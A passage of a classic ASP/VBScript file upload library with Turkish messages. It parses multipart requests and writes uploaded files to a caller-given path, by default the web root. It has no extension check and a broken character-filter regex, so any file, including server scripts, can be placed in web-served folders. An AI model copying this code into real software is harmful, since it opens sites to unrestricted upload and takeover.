			If len(trim(CStr(vTmp))) = 0 Then
				FormEx = vDefaultValue
				Exit Function
			End If

			FormEx = vTmp
			Exit Function
		End If

		FormEx = vDefaultValue
	End Function

	Public Function Inputs()
		If isobject(UploadRequest) Then
			Inputs = UploadRequest.keys
		Else
			Inputs = ""
		End If
	End Function

	Public Sub ShowUploadForm()
		Dim tmp, item

		With Response
		.Write("Dosyanyn Yüklenece?i Yol: "&Path&"<FORM ENCTYPE=""multipart/form-data"" ACTION=""?islem=Upload&Path="&Path&""" METHOD=""POST"">" & vbCrLf)
		.Write("Lütfen bir dosya seçin:<br><INPUT TYPE=""FILE"" NAME=""blob"" src=""xx"" class=""files"" style=""width: 200px;border:1px solid #CCC;margin: 5px 0 0 0;""><BR><BR>" & vbCrLf)
		.Write("<INPUT NAME=""myName"" type=""Hidden"" >" & vbCrLf)
		.Write("<INPUT TYPE=""SUBMIT"" VALUE=""Yükle"">" & vbCrLf)
		.Write("</FORM>" & vbCrLf)
		End With
	End Sub
End Class



Class FO_FileChecker
	Private oProps, sFileName, hFileBinLen, sFileBin, sFileContentType, sFileFormInputName
	
	'Class ba?langyçynda çaly?tyrakacak kod
	Private Sub Class_Initialize()
		sFileName = ""
		hFileBinLen = 0
		sFileBin = ""
		sFileContentType = ""
	End Sub

	Public Sub SetCurrentProperties(byref oPropertybag)
		Set oProps = oPropertybag
	End Sub

	Public Property Let FileInput_FormInputName(ByVal fname)
		sFileFormInputName = fname
	End Property

	Public Property Let FileInput_NamePath(ByVal fname)
		Dim realfilename

		realfilename = Right(fname, Len(fname) - InstrRev(fname,"\"))

		sFileName = trim(realfilename)
	End Property

	Public Property Let FileInput_ContentType(ByVal conttype)
		sFileContentType = conttype
	End Property

	Public Property Let FileInput_BinaryText(ByVal binstring)
		Dim  binlen

		binlen = lenb(binstring)
		hFileBinLen = binlen
		sFileBin = binstring
	End Property

	Public Function ValidateVerifyReturnFile()	
		If IllegalCharsFound Then
			Set ValidateVerifyReturnFile = FillFOFileObj(false, "", "", "dosya adynda geçersiz karakter bulunamaz", "", "", "", sFileFormInputName)
			Exit Function
		End If

		If FileNameBadOrExists Then
			Set ValidateVerifyReturnFile = FillFOFileObj(false, "", "", "bir dosya seçmediniz ya da seçti?iniz dosya yolu yanly?; bir di?er olasylyk seçti?iniz dosya zaten yüklü", "", "", "", sFileFormInputName)
			Exit Function
		End If

		Set ValidateVerifyReturnFile = FillFOFileObj(false, "", "", "", sFileContentType, sFileName, sFileBin, sFileFormInputName)
	End Function

	Private Function FillFOFileObj(byval success, byval abspath, byval virpath, byval stderr, byval contenttype, byval fname, byval binarytext, byval forminputname)
		Dim oFile
		Set oFile = New FO_File
		oFile.SetCurrentProperties oProps
		oFile.bSuccess = success
		oFile.sAbsPath = abspath
		oFile.sVirPath = virpath
		oFile.sStdErr = stderr
		oFile.sCType = contenttype
		oFile.sFileName = fname
		oFile.binValue = binarytext
		oFile.frmInputName = forminputname
		Set FillFOFileObj = oFile
	End Function	

	Public Function IllegalCharsFound()
		Dim re
	
	' Regexp ile karakterleri içeri?i kontrol ediliyor istemeyen karakter görülürse hata veriyor
		
		Set re = new regexp
		re.pattern = "\\\/\:\*\?\""\<\>\|"
		re.global = true
		re.ignorecase = true
		If re.test(sFileName) Then
			IllegalCharsFound = true
		Else
			IllegalCharsFound = false
		End If
		Set re = Nothing
	End Function

	'Dosya ismi kontrol ediliyor	
	Public Function FileNameBadOrExists()
		Dim absuploaddirectory, oFSO

		If len(trim(sFileName)) = 0 Then
			FileNameBadOrExists = true
			Exit Function
		End If
		
		If oProps.AllowOverWrite Then
			FileNameBadOrExists = false
			Exit Function
		End If

		absuploaddirectory = oProps.uploaddirectory & "\" & trim(sFileName)

		Set oFSO = server.createobject("Scripting.FileSystemObject")
		If oFSO.FileExists(absuploaddirectory) Then
			FileNameBadOrExists = true
		Else
			FileNameBadOrExists = false
		End If
		Set oFSO = Nothing
	End Function

	


End Class



Class FO_Processor
	Private Function getByteString(byval StringStr)
		dim char, i

		For i = 1 to Len(StringStr)
			char = Mid(StringStr, i, 1)
			getByteString = getByteString & chrB(AscB(char))
		Next
	End Function

	Public Function getString(byval StringBin)
		dim intCount

		getString =""
		For intCount = 1 to LenB(StringBin)
			getString = getString & chr(AscB(MidB(StringBin, intCount, 1))) 
		Next
	End Function

	Public Sub BuildUploadRequest_ASCII(ByVal sPostStr, ByRef UploadRequest) 
		dim i, j, blast, sName, vValue
		dim tmphash

		blast = false
		i = -1
		do while i <> 0
			If i = -1 Then
				i = 1
			Else
				i = i + 1
			End If
			j = instr(i, sPostStr, "=") + 1
			sName = mid(sPostStr, i, j-i-1)
			i = instr(j, sPostStr, "&")
			If i = 0 Then 
				vValue = mid(sPostStr, j)
			Else
				vValue = mid(sPostStr, j, i - j)
			End If

			Dim uploadcontrol
			Set uploadcontrol = createobject("Scripting.Dictionary")
			uploadcontrol.add "Value", vValue

			If not uploadrequest.exists(sName) Then
				uploadrequest.add sName, uploadcontrol
			Else
				Set tmphash = uploadrequest(sName)
				tmphash("Value") = tmphash("Value") & ", " & vValue
				Set uploadrequest(sName) = tmphash
			End If
		loop
	End Sub



	Public Sub BuildUploadRequest(byref RequestBin, byref UploadRequest)
		dim PosBeg, PosEnd, boundary, boundaryPos, Pos, Name, PosFile
		dim PosBound, FileName, ContentType, Value, sEncType, sReqMeth
		dim tmphash, isfile

		If lenb(RequestBin) = 0 Then 
			exit sub
		End If

		PosBeg = 1
		PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(13)))

		If posend = 0 Then
			BuildUploadRequest_ASCII getString(requestbin), UploadRequest
			Exit Sub
		End If

		boundary = MidB(RequestBin,PosBeg,PosEnd-PosBeg)
		boundaryPos = InstrB(1,RequestBin,boundary)
		Do until (boundaryPos=InstrB(RequestBin,boundary & getByteString("--")))
			Dim UploadControl
			Set UploadControl = Server.CreateObject("Scripting.Dictionary")
			Pos = InstrB(BoundaryPos,RequestBin,getByteString("Content-Disposition"))
			Pos = InstrB(Pos,RequestBin,getByteString("name="))
			PosBeg = Pos+6
			PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(34)))
			Name = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
			PosFile = InstrB(BoundaryPos,RequestBin,getByteString("filename="))
			PosBound = InstrB(PosEnd,RequestBin,boundary)

			isfile = false

			If  PosFile<>0 AND (PosFile<PosBound) Then
				PosBeg = PosFile + 10
				PosEnd =  InstrB(PosBeg,RequestBin,getByteString(chr(34)))
				FileName = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
				UploadControl.Add "FileName", FileName
				Pos = InstrB(PosEnd,RequestBin,getByteString("Content-Type:"))
				PosBeg = Pos+14
				PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(13)))
				ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))
				UploadControl.Add "ContentType",ContentType
				PosBeg = PosEnd+4
				PosEnd = InstrB(PosBeg,RequestBin,boundary)-2
				Value = MidB(RequestBin,PosBeg,PosEnd-PosBeg)

				isfile = true
			Else
				Pos = InstrB(Pos,RequestBin,getByteString(chr(13)))
				PosBeg = Pos+4
				PosEnd = InstrB(PosBeg,RequestBin,boundary)-2
				Value = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))

				isfile = false
			End If
			UploadControl.Add "Value" , Value
			UploadControl.Add "InputName", Name
			If not uploadrequest.exists(name) Then 
				UploadRequest.Add name, UploadControl	
			Else
				If not isfile Then
					Set tmphash = uploadrequest(name)
					tmphash("Value") = tmphash("Value") & ", " & Value
					Set uploadrequest(name) = tmphash
				End If
			End If

			BoundaryPos=InstrB(BoundaryPos+LenB(boundary),RequestBin,boundary)
		Loop
	End Sub
End Class



Class FO_File
	Public bSuccess
	Public sAbsPath
	Public sVirPath
	Public sStdErr
	Public sCType
	Public frmInputName
	Public binValue
	Private hBtCt, sURiPath, sFiExt
	private sfinme

	Private oProps

	Public property let sFileName(byval filenameinput)
		sFiExt = right(filenameinput, len(filenameinput) - instrrev(filenameinput, "."))
		sfinme = filenameinput
	end property

	public property get sFileName()
		sFileName = sfinme
	end property

	Private Sub Class_Initialize()
		bSuccess = false
		sAbsPath = ""
		sVirPath = ""
		sStdErr = ""
		hBtCt = 0
		sCType = ""
		sFileName = ""
		binValue = ""
		sURiPath = ""
	End Sub

	Public Sub SetCurrentProperties(byref oPropertybag)
		Set oProps = oPropertybag
	End Sub

	Public Sub SaveAsRecord(byref oField)
		sAbsPath = ""
		sVirPath = ""
		sURiPath = ""
		bSuccess = false

		If LenB(binValue) = 0 Then 
			Exit Sub
		End If

		
		If IsObject(oField) Then
			On Error Resume Next
			oField.AppendChunk binValue
			If Err Then
				sStdErr = Err.Description
				bBtCt = 0
				bSuccess = false
				Exit Sub
			End If
			On Error GoTo 0

			hBtCt = lenb(binValue)
			bSuccess = true
		End If
	End Sub

	Public Sub SaveAsFile()
		If sStdErr <> "" Then
			exit sub
		End If
		WriteUploadFile oProps.uploaddirectory & "\" & sFileName, binValue
	End Sub

	Public Function SaveAsBinaryString()
		If LenB(binValue) = 0 Then 
			bBtCt = 0
			bSuccess = false
			Exit Function
		End If

		If oProps.UploadDisabled Then
			bBtCt = 0
			bSuccess = false
			sStdErr = "Yükleme Sayfa Yönetimi Tarafyndan Engellendi"
			Exit Function
		End If

		SaveAsBinaryString = binValue
		hBtCt = lenb(binValue)
		bSuccess = true
	End Function

	Public Function SaveAsString()
		Dim outstr, i

		If LenB(binValue) = 0 Then 
			bBtCt = 0
			bSuccess = false
			Exit Function
		End If

		If oProps.UploadDisabled Then
			bBtCt = 0
			bSuccess = false
			sStdErr = "Yükleme Sayfa Yönetimi Tarafyndan Engellendi"
			Exit Function
		End If

		outstr = ""
		For i = 1 to LenB( binValue )
			outstr = outstr & chr( AscB( MidB( binValue, i, 1) ) )
		Next
		SaveAsString = outstr
		hBtCt = lenb(binValue)
		bSuccess = true
	End Function

	Public Function SaveAsBase64EncodedStr()
		Dim outstr, oEnc

		If LenB(binValue) = 0 Then 
			bBtCt = 0
			bSuccess = false
			Exit Function
		End If

		If oProps.UploadDisabled Then
			bBtCt = 0
			bSuccess = false
			sStdErr = "Yükleme Sayfa Yönetimi Tarafyndan Engellendi"
			Exit Function
		End If
		Set oEnc = New Base64Encoder
		outstr = oEnc.EncodeStr(binValue)
		Set oEnc = Nothing
		SaveAsBase64EncodedStr = outstr
		hBtCt = lenb(binValue)
		bSuccess = true
	End Function

	Private Sub WriteUploadFile(byVal NAME, byVal CONTENTS)
		dim ScriptObject, i, NewFile

		on error resume next

		
			Set ScriptObject = Server.CreateObject("Scripting.FileSystemObject")
			Set NewFile = ScriptObject.CreateTextFile( NAME )
			For i = 1 to LenB( CONTENTS )
			NewFile.Write chr( AscB( MidB( CONTENTS, i, 1) ) )
			Next
			NewFile.Close
			Set NewFile = Nothing
			Set ScriptObject = Nothing
		
		If err.number <> 0 Then
			sStdErr = Err.Description
			bSuccess = false
		Else
			sAbsPath = NAME
			sVirPath = UnMappath(NAME)
			hBtCt = lenb(CONTENTS)
			sURiPath = "http://" & Request.ServerVariables("HTTP_HOST") & sVirPath
			bSuccess = true
		End If
		on error goto 0
	End Sub

	Private Function UnMappath(byVal pathname)
		dim tmp, strRoot

		strRoot = Server.Mappath("/")
		tmp = replace( lcase( pathname ), lcase( strRoot ), "" )
		tmp = replace( tmp, "\", "/" )
		UnMappath = tmp
	End Function

	Public Property Get ContentType()
		ContentType = sCType
	End Property

	Public Property Let FileName(byval newfilename)
		Dim oFileChk
		Set oFileChk = New FO_FileChecker
		oFileChk.SetCurrentProperties oProps
		oFileChk.FileInput_NamePath = newfilename
		If oFileChk.IllegalCharsFound Then
			sStdErr = "Dosya içerisinde geçersiz karakterler bulundu"
			bSuccess = false
			Set oFileChk = Nothing
			Exit Property
		End If
		If oFileChk.FileNameBadOrExists Then
			sStdErr = "Dosya ismi geçersiz ya da bu dosyadan zaten mevcut ve üstüne yazma engellenmi?"
			bSuccess = false
			Set oFileChk = Nothing
			Exit Property
		End If

		Set oFileChk = Nothing

		sStdErr = ""
		sFileName = newfilename
	End Property

	

	

	Public Function GetFileNameFromFilePath(ByVal filewithpath)
		dim fileend

		fileend = instrrev(filewithpath, "\")
		GetFileNameFromFilePath = right(filewithpath, len(filewithpath) - fileend)
	End Function

	Public Property Get FileName()
		FileName = sFileName
	End Property

	Public Property Get UploadSuccessful()
		UploadSuccessful = bSuccess
	End Property

	Public Property Get AbsolutePath()
		AbsolutePath = sAbsPath
	End Property

	Public Property Get URLPath()
		URLPath = sURiPath
	End Property

	Public Property Get VirtualPath()
		VirtualPath = sVirPath
	End Property

	Public Property Get ErrorMessage()
		ErrorMessage = sStdErr
	End Property

	Public Property Get ByteCount()
		ByteCount = hBtCt
	End Property
End Class



Class FO_Properties
	Private sErrHead		
	Private sErrMsg			
	Private arrExt			

	Private strUploadDir		
	Private boolAllowOverwrite	
	Private lngUploadSize		
	Private bMin			
	Private bByPass			

	Private Sub Class_Initialize()
		sErrHead = "Yanly? Kurulum Hatasy"
		sErrMsg = ""
		strUploadDir = Server.Mappath("/")
		boolAllowOverwrite = false
		bByPass = false
	End Sub

	Public Sub ResetAll()
		Class_Initialize
	End Sub

	Public Property LET UploadDirectory(byVal strInput)
		Dim oFSO, bDoesntExist

		bDoesntExist = false

		If instr(strInput, "/") <> 0 Then
			strInput = ""
			Err.Raise 21342, sErrHead, _
				"Veri yolu tam olarak girilmeli."
			exit property
		End If

		Set oFSO = CreateObject("Scripting.FileSystemObject")
		If not oFSO.FolderExists(strInput) Then bDoesntExist = true
		Set oFSO = Nothing
		If bDoesntExist Then
			Err.Raise 21343, sErrHead, "HATA - """ & _
				strInput & """ Bu dosya serverda bulunmamaktadyr."
			Exit Property
		End If

		strUploadDir = strInput
	End Property

	Public Property LET AllowOverWrite(byVal boolInput)
		on error resume next
		boolInput = cbool(boolInput)
		on error goto 0
		boolAllowOverwrite = boolInput
	End Property

	

	Public Property GET UploadDirectory()
		UploadDirectory = strUploadDir
	End Property

	Public Property GET AllowOverWrite()
		AllowOverWrite = boolAllowOverwrite
	End Property

	
End Class

'Base64 kod ?ifreleyici class

Class Base64Encoder
	Private Base64Chars

	Private Sub Class_Initialize()
		Base64Chars =	"ABCDEFGHIJKLMNOPQRSTUVWXYZ" & _
				"abcdefghijklmnopqrstuvwxyz" & _
				"0123456789" & _
				"+/"
	End Sub

	Public Function EncodeStr(byVal strIn)
		Dim c1, c2, c3, w1, w2, w3, w4, n, strOut
		For n = 1 To Len(strIn) Step 3
			c1 = Asc(Mid(strIn, n, 1))
			c2 = Asc(Mid(strIn, n + 1, 1) + Chr(0))
			c3 = Asc(Mid(strIn, n + 2, 1) + Chr(0))
			w1 = Int(c1 / 4) : w2 = (c1 And 3) * 16 + Int(c2 / 16)
			If Len(strIn) >= n + 1 Then 
				w3 = (c2 And 15) * 4 + Int(c3 / 64) 
			Else 
				w3 = -1
			End If
			If Len(strIn) >= n + 2 Then 
				w4 = c3 And 63 
			Else 
				w4 = -1
			End If
			strOut = strOut + mimeencode(w1) + mimeencode(w2) + _
					  mimeencode(w3) + mimeencode(w4)
		Next
		EncodeStr = strOut
	End Function

	Private Function mimedecode(byVal strIn)
		If Len(strIn) = 0 Then 
			mimedecode = -1 : Exit Function
		Else
			mimedecode = InStr(Base64Chars, strIn) - 1
		End If
	End Function

	Public Function DecodeStr(byVal strIn)
		Dim w1, w2, w3, w4, n, strOut
		For n = 1 To Len(strIn) Step 4
			w1 = mimedecode(Mid(strIn, n, 1))
			w2 = mimedecode(Mid(strIn, n + 1, 1))
			w3 = mimedecode(Mid(strIn, n + 2, 1))
			w4 = mimedecode(Mid(strIn, n + 3, 1))
			If w2 >= 0 Then _
				strOut = strOut + _
					Chr(((w1 * 4 + Int(w2 / 16)) And 255))
			If w3 >= 0 Then _
				strOut = strOut + _
					Chr(((w2 * 16 + Int(w3 / 4)) And 255))
			If w4 >= 0 Then _
				strOut = strOut + _
					Chr(((w3 * 64 + w4) And 255))
		Next
		DecodeStr = strOut
	End Function


	Private Function mimeencode(byVal intIn)
		If intIn >= 0 Then 
			mimeencode = Mid(Base64Chars, intIn + 1, 1) 
		Else 
			mimeencode = ""
		End If
	End Function
End Class
'Upload Synyflary Biti?%>